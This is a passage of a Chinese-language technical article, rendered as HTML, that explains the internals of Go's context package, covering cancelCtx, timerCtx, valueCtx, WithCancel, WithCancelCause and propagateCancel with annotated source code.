Context</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    mu       sync<span class=\"token punctuation\">.</span>Mutex            <span class=\"token comment\">// 保护以下字段</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    done     atomic<span class=\"token punctuation\">.</span>Value          <span class=\"token comment\">// 惰性创建的 chan struct &#123;&#125;，通过第一次取消调用 close</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    children <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span>canceler<span class=\"token punctuation\">]</span><span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 通过第一次取消调用设置为空</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    err      <span class=\"token builtin\">error</span>                 <span class=\"token comment\">// 通过第一次取消调用设置为非空</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cause    <span class=\"token builtin\">error</span>                 <span class=\"token comment\">// 通过第一次取消调用设置为非空</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>具体的取消逻辑见下文</p>\n<h2 id=\"stopctx\"><a class=\"anchor\" href=\"#stopctx\">#</a> stopCtx</h2>\n<p>stopCtx 被用作 cancelCtx 的 parent context 当一个 AfterFunc 已在 parent context 中注册时.<br />\n 它包含用于取消注册 AfterFunc 的停止函数。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> stopCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Context</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    stop <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"timerctx\"><a class=\"anchor\" href=\"#timerctx\">#</a> timerCtx</h2>\n<p>timerCtx 带有一个计时器和一个截止时间。</p>\n<p>通过停止计时器然后委托给 cancelCtx.cancel 来实现特定时间取消。</p>\n<p>嵌入了 cancelCtx 来实现 Done 和 Err 操作。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> timerCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    cancelCtx</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    timer <span class=\"token operator\">*</span>time<span class=\"token punctuation\">.</span>Timer <span class=\"token comment\">// Under cancelCtx.mu.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    deadline time<span class=\"token punctuation\">.</span>Time</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"valuectx\"><a class=\"anchor\" href=\"#valuectx\">#</a> valueCtx</h2>\n<p>valueCtx 携带了两个无限制变量 <code>key, val any</code> 。嵌入了 Context 来实现其他调用。</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> valueCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Context</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    key<span class=\"token punctuation\">,</span> val any</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"cancel\"><a class=\"anchor\" href=\"#cancel\">#</a> cancel</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> cancelCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Context</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    mu       sync<span class=\"token punctuation\">.</span>Mutex            <span class=\"token comment\">// 保护以下字段</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  done     atomic<span class=\"token punctuation\">.</span>Value          <span class=\"token comment\">// 惰性创建的 chan struct &#123;&#125;，通过第一次取消调用 close</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    children <span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span>canceler<span class=\"token punctuation\">]</span><span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">// 通过第一次取消调用设置为空</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    err      <span class=\"token builtin\">error</span>                 <span class=\"token comment\">// 通过第一次取消调用设置为非空</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    cause    <span class=\"token builtin\">error</span>                 <span class=\"token comment\">// 通过第一次取消调用设置为非空</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"创建-cancelctx\"><a class=\"anchor\" href=\"#创建-cancelctx\">#</a> 创建 cancelCtx</h2>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// CancelFunc 告诉操作放弃其工作。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// CancelFunc 不会等待工作停止。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// CancelFunc 可能被多个 goroutine 同时调用。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 第一次调用后，对 CancelFunc 的后续调用不会执行任何操作。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">type</span> CancelFunc <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// WithCancel 返回父级的副本，其中包含新的 Done 通道。</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 当调用返回的取消函数或关闭 parent context 的 Done 通道时（以先发生者为准），返回 context 的 Done 通道将关闭。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 取消此 context 会释放与其关联的资源，因此代码应在此 context 中操作完成后立即调用取消。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithCancel</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>ctx Context<span class=\"token punctuation\">,</span> cancel CancelFunc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    c <span class=\"token operator\">:=</span> <span class=\"token function\">withCancel</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> Canceled<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// CancelCauseFunc 的行为类似于 [CancelFunc]，但还设置了取消原因。</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 可以通过调用 [Cause] 方法在取消的 context 或其任何衍生的 context 来检索取消原因。</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">// 如果 context 已被取消，则 CancelCauseFunc 不会设置 cause。</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// 例如，如果 childContext 衍生自 parentContext：</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">//      如果在使用 cause2 取消 childContext 之前使用 cause1 取消了 parentContext，</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">//      则 Cause (parentContext) == Cause (childContext) == cause1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//      如果在使用 cause1 取消 parentContext 之前使用 cause2 取消了 childContext</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token comment\">//      则 Cause (parentContext) == cause1 并且 Cause (childContext) == cause2</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">type</span> CancelCauseFunc <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// WithCancelCause 的行为类似于 [WithCancel]，但返回的是 [CancelCauseFunc]，而不是 [CancelFunc]。</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// 使用非空错误（cause）调用 cancel 会将该错误记录在 ctx 中； 然后可以使用 Cause (ctx) 检索它。</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 使用 nil 调用 cancel 会将原因设置为 Canceled。</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">// Example use:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">//  ctx, cancel := context.WithCancelCause(parent)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">//  cancel(myError)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">//  ctx.Err() // returns context.Canceled</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">//  context.Cause(ctx) // returns myError</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithCancelCause</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>ctx Context<span class=\"token punctuation\">,</span> cancel CancelCauseFunc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    c <span class=\"token operator\">:=</span> <span class=\"token function\">withCancel</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span>cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> Canceled<span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">withCancel</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>cancelCtx <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> parent <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cannot create context from nil parent\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    c <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>cancelCtx<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    c<span class=\"token punctuation\">.</span><span class=\"token function\">propagateCancel</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> c</pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//propagateCancel 设置了 当 parent canceled 的时候 child 也会被 cancel</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>cancelCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">propagateCancel</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> child canceler<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    c<span class=\"token punctuation\">.</span>Context <span class=\"token operator\">=</span> parent</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    done <span class=\"token operator\">:=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> done <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token comment\">// parent is never canceled</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\">// 如果 done channel 不是 nil，说明 parent Context 是一个可以取消的 Context</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 如果 done channel 可读取，说明上面为无锁阶段</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// 如果 parent Context 已经被取消了，那么应该立即取消 child Context</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">select</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>done<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">// parent is already canceled</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        child<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Cause</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\">// 获取最底层的 cancelCtx</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> p<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> <span class=\"token function\">parentCancelCtx</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ok <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">//parent 为 *cancelCtx, 能转换成 cancelCtx</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        p<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">if</span> p<span class=\"token punctuation\">.</span>err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token comment\">//parent 已经被 cancel 了</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            child<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span>err<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span>cause<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">if</span> p<span class=\"token punctuation\">.</span>children <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                p<span class=\"token punctuation\">.</span>children <span class=\"token operator\">=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">map</span><span class=\"token punctuation\">[</span>canceler<span class=\"token punctuation\">]</span><span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            p<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">[</span>child<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        p<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span> a<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> parent<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>afterFuncer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ok <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token comment\">//parent 实现了一个 AfterFunc 方法.</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        stop <span class=\"token operator\">:=</span> a<span class=\"token punctuation\">.</span><span class=\"token function\">AfterFunc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            child<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Cause</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        c<span class=\"token punctuation\">.</span>Context <span class=\"token operator\">=</span> stopCtx<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            Context<span class=\"token punctuation\">:</span> parent<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            stop<span class=\"token punctuation\">:</span>    stop<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token comment\">// 当 parent cancel 时，同步 cancel child</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    goroutines<span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">select</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>parent<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            child<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Cause</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token operator\">&lt;-</span>child<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">//parentCancelCtx 返回父节点的底层 *cancelCtx。</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">// 它通过查找 parent.Value (&amp;cancelCtxKey) 来找到最内层的 * cancelCtx，然后检查 parent.Done () 是否与该 * cancelCtx 匹配（如果不匹配，则该 * cancelCtx 已被一个提供不同完成通道的自定义实现所封装，在这种情况下，我们不应跳过它）。</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">parentCancelCtx</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>cancelCtx<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    done <span class=\"token operator\">:=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>  <span class=\"token comment\">// 如果 parent context 的 done 为 可复用的 closedchan 说明 parent context 已经 cancel 了</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>  <span class=\"token comment\">// 如果 parent context 的 done 为 nil 说明不支持 cancel，那么就不可能是 cancelCtx</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token keyword\">if</span> done <span class=\"token operator\">==</span> closedchan <span class=\"token operator\">||</span> done <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>  <span class=\"token comment\">// 如果 parent context 属于原生的 *cancelCtx 或衍生类型 (timerCtx) 需要继续进行后续判断</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token comment\">// 如果 parent context 无法转换到 *cancelCtx，则认为非 cancelCtx，返回 nil,fasle</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    p<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Value</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>cancelCtxKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>cancelCtx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"79\"></td><td><pre>  <span class=\"token comment\">// 经过上面的判断后，说明 parent context 可以被转换为 *cancelCtx，这时存在多种情况:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token comment\">//   - parent context 就是 *cancelCtx</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token comment\">//   - parent context 是标准库中的 timerCtx</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token comment\">//   - parent context 是个自己自定义包装的 cancelCtx</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token comment\">// 针对这 3 种情况需要进行判断，判断方法就是: </span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token comment\">//   判断 parent context 通过 Done () 方法获取的 done channel 与 Value 查找到的 context 的 done channel 是否一致</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token comment\">// </span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token comment\">// 一致情况说明 parent context 为 cancelCtx 或 